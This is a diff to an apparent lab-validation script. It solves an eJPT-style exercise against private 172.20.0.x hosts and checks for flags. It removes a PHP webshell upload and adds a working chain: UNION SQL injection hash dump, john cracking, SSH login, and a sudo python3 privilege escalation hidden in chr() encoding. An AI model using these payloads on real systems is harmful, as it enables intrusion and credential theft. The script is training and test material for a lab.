@@ -16,13 +16,12 @@ chk "172.20.0.30" "$OUT" "smb-03 topildi"
 echo "### 1) web-01: SQLi -> creds -> upload RCE -> www-data -> root"
 # UNION SQLi -> sysadmin cred
 SQLI=$($A "curl -s 'http://172.20.0.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-'")
-chk "Ac3m3S3rv3r!" "$SQLI" "UNION SQLi sysadmin parolini dump qildi"
-# upload webshell
-$A "printf '<?php system(\$_GET[\"c\"]); ?>' > /tmp/sh.php && curl -s -c /tmp/cj -b /tmp/cj -d \"username=admin'--+-&password=x\" http://172.20.0.10/index.php -o /dev/null; curl -s -b /tmp/cj -F 'file=@/tmp/sh.php' http://172.20.0.10/dashboard.php -o /dev/null" >/dev/null 2>&1
-RCE=$($A "curl -s 'http://172.20.0.10/uploads/sh.php?c=id'")
-chk "www-data" "$RCE" "upload -> webshell RCE (www-data)"
-UF=$($A "curl -s 'http://172.20.0.10/uploads/sh.php?c=cat+/var/www/html/user.txt'")
-chk "EJPT{" "$UF" "web-01 USER flag"
+chk "acme02" "$SQLI" "UNION SQLi sysadmin md5crypt hashini dump qildi (crack->SSH)"
+# crack the leaked md5crypt hash with john (in the container) -> SSH password
+CPW=$($A "H=\$(curl -s 'http://172.20.0.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-' | grep -oE 'sysadmin</td><td>[^<]+' | sed 's/.*<td>//'); rm -f /root/.john/john.pot; printf 'sysadmin:%s\n' \"\$H\" > /tmp/h.txt; john --wordlist=/root/wordlist.txt /tmp/h.txt >/dev/null 2>&1; john --show /tmp/h.txt 2>/dev/null | head -1 | cut -d: -f2")
+chk "Ac3m3S3rv3r!" "$CPW" "SQLi hash -> john crack -> SSH parol"
+UF=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@172.20.0.10 'cat /var/www/html/user.txt' 2>/dev/null")
+chk "EJPT{" "$UF" "web-01 USER flag (crack -> SSH foothold)"
 # privesc via ssh sysadmin + sudo python3
 ROOT=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@172.20.0.10 'sudo /usr/bin/python3 -c \"import os;os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))\"' 2>/dev/null")
 chk "EJPT{" "$ROOT" "web-01 ROOT flag (sudo python3)"
